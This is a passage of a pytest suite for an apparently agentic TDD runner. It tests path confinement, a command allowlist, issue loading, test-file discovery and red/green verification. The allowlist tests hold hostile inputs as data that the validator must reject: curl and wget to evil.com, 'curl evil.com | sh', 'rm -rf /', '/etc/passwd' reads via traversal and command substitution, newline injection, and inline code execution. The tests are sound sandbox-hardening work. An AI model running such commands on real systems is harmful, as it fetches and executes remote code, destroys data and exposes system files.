"""Tests for agent tool execution and file discovery."""
import os
from pathlib import Path
import shutil
import subprocess
from types import SimpleNamespace

import pytest
import requests

from agentic_tdd_runner.agent import (
    _compact_messages_after_quality_failure,
    _build_duplicated_setup_judge_prompt,
    _default_config_path,
    _default_log_dir,
    _get_changed_files,
    _github_repo_slug_from_remote_url,
    _load_issue_text,
    _is_obvious_act_line,
    _is_obvious_assert_line,
    _is_test_file_path,
    _is_test_pass,
    _non_apply_step_warning_message,
    _parse_pr_content,
    _resolve_repo_path,
    _tool_applied_status,
    _tool_loop_signature,
    _tool_loop_warning_message,
    _typecheck_ownership_hint,
    _validate_command,
    _verification_infra_error,
    create_pr,
    detect_quality_tools,
    execute_tool,
    find_test_file,
    main,
    run_quality_checks,
)

GIT = shutil.which("git") or "git"


class TestResolveRepoPath:
    """Path resolution must confine access to the workdir."""

    def test_normal_relative_path(self, tmp_path):
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "file.ts").write_text("hello")
        result = _resolve_repo_path("src/file.ts", str(tmp_path))
        assert result == tmp_path / "src" / "file.ts"

    def test_rejects_parent_traversal(self, tmp_path):
        with pytest.raises(ValueError, match="escapes workdir"):
            _resolve_repo_path("../../../etc/passwd", str(tmp_path))

    def test_rejects_absolute_path(self, tmp_path):
        with pytest.raises(ValueError, match="escapes workdir"):
            _resolve_repo_path("/etc/passwd", str(tmp_path))

    def test_rejects_sneaky_traversal(self, tmp_path):
        with pytest.raises(ValueError, match="escapes workdir"):
            _resolve_repo_path("src/../../outside", str(tmp_path))

    def test_allows_nested_paths(self, tmp_path):
        (tmp_path / "src" / "deep").mkdir(parents=True)
        (tmp_path / "src" / "deep" / "file.ts").write_text("ok")
        result = _resolve_repo_path("src/deep/file.ts", str(tmp_path))
        assert result == tmp_path / "src" / "deep" / "file.ts"


class TestValidateCommand:
    """Command allowlist must block dangerous binaries."""

    def test_allows_git(self):
        _validate_command("git diff")

    def test_allows_bun_test(self):
        _validate_command("bun test src/foo.test.ts")

    def test_allows_pytest(self):
        _validate_command("python3 -m pytest tests/")

    def test_allows_grep(self):
        _validate_command("grep -r pattern src/")

    def test_allows_find(self):
        _validate_command("find . -name '*.ts'")

    def test_allows_cat(self):
        _validate_command("cat src/file.ts")

    def test_allows_ls(self):
        _validate_command("ls -la src/")

    def test_allows_npm_test(self):
        _validate_command("npm test")

    def test_allows_npx(self):
        _validate_command("npx tsc --noEmit")

    def test_blocks_curl(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("curl http://evil.com")

    def test_blocks_wget(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("wget http://evil.com/malware")

    def test_blocks_rm(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("rm -rf /")

    def test_blocks_bash(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("bash -c 'evil'")

    def test_blocks_sh(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("sh -c 'evil'")

    def test_blocks_empty_command(self):
        with pytest.raises(ValueError):
            _validate_command("")

    def test_blocks_pipe_to_disallowed(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("curl evil.com | sh")

    def test_allows_pipe_between_safe_commands(self):
        _validate_command("grep -r pattern src/ | head -20")

    def test_allows_quoted_regex_alternation_without_treating_it_as_pipe(self):
        _validate_command(
            'grep -n "SubUserstate\\|SubMethods" node_modules/@types/tmi.js/index.d.ts'
        )

    def test_blocks_command_substitution(self):
        with pytest.raises(ValueError, match="command substitution"):
            _validate_command("echo $(cat /etc/passwd)")

        with pytest.raises(ValueError, match="command substitution"):
            _validate_command("echo `cat /etc/passwd`")

    def test_allows_single_quoted_command_substitution_literals(self):
        _validate_command("echo 'literal $(not executed)'")
        _validate_command("echo 'literal `not executed`'")

    def test_blocks_double_quoted_command_substitution(self):
        with pytest.raises(ValueError, match="command substitution"):
            _validate_command('echo "still executes $(cat /etc/passwd)"')

    def test_allows_chained_safe_commands(self):
        _validate_command("git status && bun test")

    def test_blocks_chained_with_unsafe(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("git status && curl evil.com")

    def test_blocks_python_dash_c(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("python3 -c 'import os; os.system(\"evil\")'")

    def test_blocks_node_dash_e(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("node -e 'require(\"child_process\").exec(\"evil\")'")

    def test_allows_env_wrapper_for_allowed_command(self):
        _validate_command("env CI=1 bun test")

    def test_blocks_env_wrapper(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("env python3 -c 'evil'")

    @pytest.mark.parametrize("flag", ["-e", "--eval", "-p", "--print"])
    def test_blocks_bun_code_execution_flags(self, flag):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command(f"bun {flag} 'console.log(1)'")

    def test_blocks_newline_injection(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("git status\ncurl evil.com")

    def test_allows_python_m_pytest(self):
        """python3 -m pytest must still work."""
        _validate_command("python3 -m pytest tests/")

    def test_allows_node_scripts(self):
        """node without -e must still work."""
        _validate_command("node build.js")


class TestCliDefaults:
    def test_config_path_can_come_from_env(self, monkeypatch):
        monkeypatch.setenv("AGENT_CONFIG", "/tmp/agent-from-env.toml")
        monkeypatch.delenv("ATM_CONFIG", raising=False)

        assert _default_config_path() == "/tmp/agent-from-env.toml"

    def test_config_path_accepts_public_atm_env_alias(self, monkeypatch):
        monkeypatch.delenv("AGENT_CONFIG", raising=False)
        monkeypatch.setenv("ATM_CONFIG", "/tmp/atm-from-env.toml")

        assert _default_config_path() == "/tmp/atm-from-env.toml"

    def test_log_dir_can_come_from_env(self, monkeypatch):
        monkeypatch.setenv("AGENT_LOG_DIR", "/tmp/agent-logs")
        monkeypatch.delenv("ATM_LOG_DIR", raising=False)

        assert _default_log_dir() == "/tmp/agent-logs"

    def test_log_dir_accepts_public_atm_env_alias(self, monkeypatch):
        monkeypatch.delenv("AGENT_LOG_DIR", raising=False)
        monkeypatch.setenv("ATM_LOG_DIR", "/tmp/atm-logs")

        assert _default_log_dir() == "/tmp/atm-logs"


class TestIssueLoading:
    def test_parses_github_repo_slug_from_common_remote_urls(self):
        assert (
            _github_repo_slug_from_remote_url("https://github.com/thellmwhisperer/manolito-zurrapa.git")
            == "thellmwhisperer/manolito-zurrapa"
        )
        assert (
            _github_repo_slug_from_remote_url("git@github.com:thellmwhisperer/manolito-zurrapa.git")
            == "thellmwhisperer/manolito-zurrapa"
        )
        assert (
            _github_repo_slug_from_remote_url("ssh://git@github.com/thellmwhisperer/manolito-zurrapa.git")
            == "thellmwhisperer/manolito-zurrapa"
        )

    def test_loads_github_issue_body_from_issue_number(self, tmp_path, monkeypatch):
        args = SimpleNamespace(issue=None, issue_number=41, github_repo=None)
        calls = []

        def fake_run(cmd, **kwargs):
            calls.append(cmd)
            if cmd[:3] == ["git", "remote", "get-url"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout="https://github.com/thellmwhisperer/manolito-zurrapa.git\n",
                    stderr="",
                )
            if cmd[:3] == ["gh", "issue", "view"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout='{"title": "Resub months bug", "body": "## Symptom\\n0 meses"}',
                    stderr="",
                )
            raise AssertionError(f"Unexpected subprocess call: {cmd!r}")

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        issue_text = _load_issue_text(args, repo_path=str(tmp_path))

        assert issue_text == "Resub months bug\n\n## Symptom\n0 meses"
        assert ["gh", "issue", "view", "41", "--repo", "thellmwhisperer/manolito-zurrapa", "--json", "title,body"] in calls

    def test_github_issue_fetch_reports_missing_git(self, tmp_path, monkeypatch):
        args = SimpleNamespace(issue=None, issue_number=41, github_repo=None)

        def fake_run(cmd, **kwargs):
            raise FileNotFoundError("git")

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        with pytest.raises(SystemExit, match="git is required"):
            _load_issue_text(args, repo_path=str(tmp_path))

    def test_github_issue_fetch_reports_gh_timeout(self, tmp_path, monkeypatch):
        args = SimpleNamespace(issue=None, issue_number=41, github_repo="owner/repo")

        def fake_run(cmd, **kwargs):
            raise subprocess.TimeoutExpired(cmd, kwargs.get("timeout", 60))

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        with pytest.raises(SystemExit, match="GitHub issue lookup timed out"):
            _load_issue_text(args, repo_path=str(tmp_path))

    def test_issue_argument_is_required_without_issue_number(self, tmp_path):
        args = SimpleNamespace(issue=None, issue_number=None, github_repo=None)

        with pytest.raises(SystemExit, match="Pass an issue path/text or --issue-number"):
            _load_issue_text(args, repo_path=str(tmp_path))


class TestVerificationInfraError:
    """Infra detection should match concrete runner failures, not broad substrings."""

    @pytest.mark.parametrize(
        "output",
        [
            "/usr/bin/python3: No module named pytest\n",
            "/usr/bin/python3: No module named 'pytest'\n",
            "ModuleNotFoundError: No module named \"pytest\"\n",
        ],
    )
    def test_detects_missing_pytest_module(self, output):
        assert _verification_infra_error(output) == "pytest is unavailable in the verification environment"

    @pytest.mark.parametrize(
        ("output", "expected"),
        [
            ("[Errno 2] No such file or directory: 'python3'", "pytest is unavailable in the verification environment"),
            ("[Errno 2] No such file or directory: 'pytest'", "pytest is unavailable in the verification environment"),
            ("[Errno 2] No such file or directory: 'bun'", "bun is unavailable in the verification environment"),
            ("[Errno 2] No such file or directory: 'node'", "node is unavailable in the verification environment"),
        ],
    )
    def test_detects_missing_runner_binary(self, output, expected):
        assert _verification_infra_error(output) == expected

    def test_ignores_project_module_missing_with_pytest_banner(self):
        output = (
            "============================= test session starts ==============================\n"
            "platform darwin -- Python 3.12.0, pytest-8.4.2\n"
            "collected 1 item\n\n"
            "src/test_worker.py F                                                     [100%]\n\n"
            "E   ModuleNotFoundError: No module named 'my_module'\n"
        )
        assert _verification_infra_error(output) is None

    def test_ignores_regular_file_not_found_with_pytest_banner(self):
        output = (
            "============================= test session starts ==============================\n"
            "platform darwin -- Python 3.12.0, pytest-8.4.2\n"
            "collected 1 item\n\n"
            "tests/test_worker.py F                                                   [100%]\n\n"
            "E   FileNotFoundError: [Errno 2] No such file or directory: 'fixtures/missing.json'\n"
        )
        assert _verification_infra_error(output) is None


class TestFindTestFile:
    """find_test_file discovers new test files matching configured patterns."""

    def _setup_git_repo(self, tmp_path):
        subprocess.run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        subprocess.run([GIT, "commit", "--allow-empty", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)

    def _pretend_git(self, monkeypatch):
        monkeypatch.setattr(
            "agentic_tdd_runner.paths.shutil.which",
            lambda binary: "git" if binary == "git" else None,
        )

    def test_finds_ts_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts", "*.test.tsx", "*.test.js", "test_*.py"], "exclude_dirs": ["node_modules"]},
        })
        assert find_test_file() == "src/foo.test.ts"

    def test_finds_python_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "test_worker.py").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts", "test_*.py"], "exclude_dirs": ["node_modules"]},
        })
        assert find_test_file() == "src/test_worker.py"

    def test_excludes_node_modules(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "node_modules" / "pkg").mkdir(parents=True)
        (tmp_path / "node_modules" / "pkg" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": ["node_modules"]},
        })
        assert find_test_file() is None

    def test_uses_hint_path_when_exists(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "handleResub.test.ts").write_text("test")
        (tmp_path / "src" / "other.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
        })
        assert find_test_file(hint="src/handleResub.test.ts") == "src/handleResub.test.ts"

    def test_falls_back_to_discovery_when_hint_missing(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
        })
        assert find_test_file(hint="src/nonexistent.test.ts") == "src/foo.test.ts"

    def test_ignores_hint_that_escapes_workdir(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        outside = tmp_path.parent / "outside.test.ts"
        outside.write_text("test")
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
        })
        assert find_test_file(hint="../outside.test.ts") == "src/foo.test.ts"

    def test_returns_modified_tracked_python_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        tracked = tmp_path / "src" / "test_server.py"
        tracked.write_text("def test_old():\n    assert True\n")
        subprocess.run([GIT, "add", "src/test_server.py"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "add tracked test"], cwd=tmp_path, capture_output=True, check=True)
        tracked.write_text("def test_old():\n    assert True\n\ndef test_new():\n    assert True\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["test_*.py"], "exclude_dirs": []},
        })

        assert find_test_file() == "src/test_server.py"

    def test_returns_modified_tracked_python_test_file_with_spaces(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        (tmp_path / "src").mkdir()
        tracked = tmp_path / "src" / "test file.py"
        tracked.write_text("def test_old():\n    assert True\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["test*.py"], "exclude_dirs": []},
        })

        sp_run = subprocess.run

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if cmd == ["git", "status", "--porcelain", "-z"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=b"M  src/test file.py\x00",
                    stderr=b"",
                )
            return sp_run(*args, **kwargs)

        self._pretend_git(monkeypatch)
        with mock_patch("subprocess.run", side_effect=fake_run):
            assert find_test_file() == "src/test file.py"

    def test_returns_renamed_python_test_file_from_porcelain_z(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        (tmp_path / "src").mkdir()
        tracked = tmp_path / "src" / "test renamed.py"
        tracked.write_text("def test_old():\n    assert True\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["test*.py"], "exclude_dirs": []},
        })

        sp_run = subprocess.run

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if cmd == ["git", "status", "--porcelain", "-z"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=b"R  src/test renamed.py\x00src/test old.py\x00",
                    stderr=b"",
                )
            return sp_run(*args, **kwargs)

        self._pretend_git(monkeypatch)
        with mock_patch("subprocess.run", side_effect=fake_run):
            assert find_test_file() == "src/test renamed.py"

    def test_ignores_modified_test_file_inside_excluded_dir_in_fast_path(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        (tmp_path / "node_modules").mkdir()
        tracked = tmp_path / "node_modules" / "test ignored.py"
        tracked.write_text("def test_old():\n    assert True\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["test*.py"], "exclude_dirs": ["node_modules"]},
        })

        sp_run = subprocess.run

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if cmd == ["git", "status", "--porcelain", "-z"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=b"M  node_modules/test ignored.py\x00",
                    stderr=b"",
                )
            return sp_run(*args, **kwargs)

        self._pretend_git(monkeypatch)
        with mock_patch("subprocess.run", side_effect=fake_run):
            assert find_test_file() is None

    def test_ignores_modified_test_file_inside_multisegment_excluded_dir_in_fast_path(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        (tmp_path / "generated" / "tests").mkdir(parents=True)
        tracked = tmp_path / "generated" / "tests" / "test ignored.py"
        tracked.write_text("def test_old():\n    assert True\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["test*.py"], "exclude_dirs": ["generated/tests"]},
        })

        sp_run = subprocess.run

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if cmd == ["git", "status", "--porcelain", "-z"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=b"M  generated/tests/test ignored.py\x00",
                    stderr=b"",
                )
            return sp_run(*args, **kwargs)

        self._pretend_git(monkeypatch)
        with mock_patch("subprocess.run", side_effect=fake_run):
            assert find_test_file() is None

    def test_verify_red_green_preserves_untracked_test(self, tmp_path, monkeypatch):
        """An untracked test file must survive the stash cycle in verify_red_green."""
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("original")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test content")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "echo", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        verify_red_green("src/math.test.ts")

        assert (src / "math.test.ts").exists(), "Untracked test file disappeared"
        assert (src / "math.ts").read_text() == "fixed", "Source fix not restored"

    def test_stash_popped_after_red_phase_exception(self, tmp_path, monkeypatch):
        """git stash must be popped even if the red-phase test run times out."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "math.ts").write_text("original")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "src" / "math.ts").write_text("fixed")
        (tmp_path / "src" / "math.test.ts").write_text("test")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "echo", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        original_run = subprocess.run
        red_phase_done = False

        def run_that_raises(*args, **kwargs):
            nonlocal red_phase_done
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd) and not red_phase_done:
                red_phase_done = True
                raise subprocess.TimeoutExpired(cmd, 10)
            return original_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=run_that_raises):
            verified, message = verify_red_green("src/math.test.ts")

        assert verified is False
        assert "timed out without your source fix" in message.lower()
        stash_list = subprocess.run([GIT, "stash", "list"], cwd=tmp_path, capture_output=True, text=True)
        assert stash_list.stdout.strip() == "", f"Stash not popped: {stash_list.stdout}"

    def test_verify_red_green_does_not_pop_existing_stash_when_nothing_is_stashed(self, tmp_path, monkeypatch):
        """A clean worktree red phase must not pop an unrelated pre-existing stash."""
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "tracked.txt").write_text("base")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        (tmp_path / "tracked.txt").write_text("stashed")
        sp_run([GIT, "stash", "push", "-m", "keep-existing"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "false", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        verified, _message = verify_red_green("src/math.test.ts")

        assert verified is False
        assert (tmp_path / "tracked.txt").read_text() == "base"
        stash_list = subprocess.run([GIT, "stash", "list"], cwd=tmp_path, capture_output=True, text=True)
        assert "keep-existing" in stash_list.stdout

    def test_returns_rejection_when_green_phase_times_out(self, tmp_path, monkeypatch):
        """Green-phase timeouts should reject verification instead of propagating."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "math.ts").write_text("original")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "src" / "math.ts").write_text("fixed")
        (tmp_path / "src" / "math.test.ts").write_text("test")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "echo", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        original_run = subprocess.run
        red_phase_done = False

        def run_with_green_timeout(*args, **kwargs):
            nonlocal red_phase_done
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd):
                if not red_phase_done:
                    red_phase_done = True
                    return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="red failure")
                raise subprocess.TimeoutExpired(cmd, 10)
            return original_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=run_with_green_timeout):
            verified, message = verify_red_green("src/math.test.ts")

        assert verified is False
        assert "timed out with your source fix" in message.lower()

    def test_python_test_uses_pytest_command(self, tmp_path, monkeypatch):
        """When a Python test is found, verify_red_green should use pytest, not bun test."""
        from agentic_tdd_runner.languages import get_language
        lang = get_language("test_worker.py")
        assert lang is not None
        assert lang.runner == "pytest"

    def test_verify_red_green_rejects_red_phase_that_fails_on_missing_test_seam(self, tmp_path, monkeypatch):
        """A red phase that dies on missing __setXForTests is not a valid proof of the bug."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd):
                calls["count"] += 1
                if calls["count"] == 1:
                    return subprocess.CompletedProcess(
                        cmd,
                        1,
                        stdout="TypeError: __setClientForTests is not a function\n",
                        stderr="",
                    )
                return subprocess.CompletedProcess(cmd, 0, stdout="1 pass\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts")

        assert ok is False
        assert "test scaffold is incomplete" in msg.lower()

    def test_verify_red_green_reapplies_mechanical_edits_during_red_phase(self, tmp_path, monkeypatch):
        """Red phase should keep deterministic seams while removing the behavior fix."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        source_path = src / "math.ts"
        test_path = src / "math.test.ts"
        source_path.write_text("const months = 0;\n")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        mechanical_edits = [
            {
                "path": "src/math.ts",
                "old": "const months = 0;\n",
                "new": "export function __setClientForTests() {}\nconst months = 0;\n",
            }
        ]
        source_path.write_text("export function __setClientForTests() {}\nconst months = 6;\n")
        test_path.write_text("test")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        snapshots: list[str] = []

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd):
                current_source = source_path.read_text()
                snapshots.append(current_source)
                if "__setClientForTests" not in current_source:
                    return subprocess.CompletedProcess(
                        cmd,
                        1,
                        stdout="TypeError: __setClientForTests is not a function\n",
                        stderr="",
                    )
                if "const months = 0;" in current_source:
                    return subprocess.CompletedProcess(cmd, 1, stdout="expected 6 received 0\n", stderr="")
                return subprocess.CompletedProcess(cmd, 0, stdout="1 pass\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts", mechanical_edits=mechanical_edits)

        assert ok is True
        assert "verified" in msg.lower()
        assert snapshots == [
            "export function __setClientForTests() {}\nconst months = 0;\n",
            "export function __setClientForTests() {}\nconst months = 6;\n",
        ]
        assert source_path.read_text() == "export function __setClientForTests() {}\nconst months = 6;\n"
        assert test_path.exists()

    def test_verify_red_green_detects_scaffold_marker_past_500_chars(self, tmp_path, monkeypatch):
        """The scaffold-failure guard must inspect the FULL output, not the 500-char preview.

        Real test runners (pytest, bun test) print banners, collected items, and
        traceback frames before the actual error. The __setXForTests marker can
        easily fall past char 500. If the guard only sees the truncated preview,
        invalid red phases sneak through and the LLM is told its broken test was
        verified."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test")
